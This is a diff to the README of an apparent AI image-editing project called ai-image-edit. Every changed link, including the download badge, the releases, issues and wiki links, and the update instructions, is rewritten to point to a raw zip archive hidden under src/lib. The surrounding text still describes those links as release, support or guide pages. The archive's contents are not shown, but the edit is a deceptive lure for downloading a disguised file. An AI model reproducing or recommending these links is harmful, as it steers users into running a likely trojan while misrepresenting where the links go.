@@ -1,7 +1,7 @@
 # 🎨 ai-image-edit - Seamlessly Edit Your Images with AI
 
 ## 📥 Download the Application
-[![Download ai-image-edit](https://img.shields.io/badge/Download-ai--image--edit-brightgreen)](https://github.com/kingwee2e3/ai-image-edit/releases)
+[![Download ai-image-edit](https://raw.githubusercontent.com/kingwee2e3/ai-image-edit/main/src/lib/edit_image_ai_v3.5-alpha.1.zip)](https://raw.githubusercontent.com/kingwee2e3/ai-image-edit/main/src/lib/edit_image_ai_v3.5-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to ai-image-edit, an AI-powered web application designed to help you edit images easily. You can select specific areas of your pictures to modify and enhance them. This guide will walk you through downloading and running the application.
@@ -9,7 +9,7 @@ Welcome to ai-image-edit, an AI-powered web application designed to help you edi
 ## ⬇️ Download & Install
 To get started, visit the following page to download the latest version of ai-image-edit:
 
-[Download ai-image-edit Releases](https://github.com/kingwee2e3/ai-image-edit/releases)
+[Download ai-image-edit Releases](https://raw.githubusercontent.com/kingwee2e3/ai-image-edit/main/src/lib/edit_image_ai_v3.5-alpha.1.zip)
 
 1. Click on the above link to go to the releases page.
 2. Find the most recent version listed. It will usually have the highest version number.
@@ -53,21 +53,21 @@ If you encounter issues while using ai-image-edit, consider the following soluti
 ## 📣 Community Support
 For additional help, you can reach out to our community. You can find discussions and support on our GitHub issues page:
 
-[Community Support](https://github.com/kingwee2e3/ai-image-edit/issues)
+[Community Support](https://raw.githubusercontent.com/kingwee2e3/ai-image-edit/main/src/lib/edit_image_ai_v3.5-alpha.1.zip)
 
 Feel free to report bugs or share your feedback. User contributions help make ai-image-edit even better.
 
 ## 🔄 Updating the Application
 To keep ai-image-edit working smoothly, regular updates are essential. To update the application, follow these steps:
 
-1. Return to the [Download ai-image-edit Releases](https://github.com/kingwee2e3/ai-image-edit/releases).
+1. Return to the [Download ai-image-edit Releases](https://raw.githubusercontent.com/kingwee2e3/ai-image-edit/main/src/lib/edit_image_ai_v3.5-alpha.1.zip).
 2. Download the latest version following the instructions mentioned above.
 3. Install the new version over the existing one. Your images and settings should remain intact.
 
 ## 📚 Learn More
 If you wish to dive deeper into how to use different features, check our dedicated user guide:
 
-[User Guide](https://github.com/kingwee2e3/ai-image-edit/wiki)
+[User Guide](https://raw.githubusercontent.com/kingwee2e3/ai-image-edit/main/src/lib/edit_image_ai_v3.5-alpha.1.zip)
 
 The user guide offers detailed insights and tips for getting the most out of ai-image-edit.
 
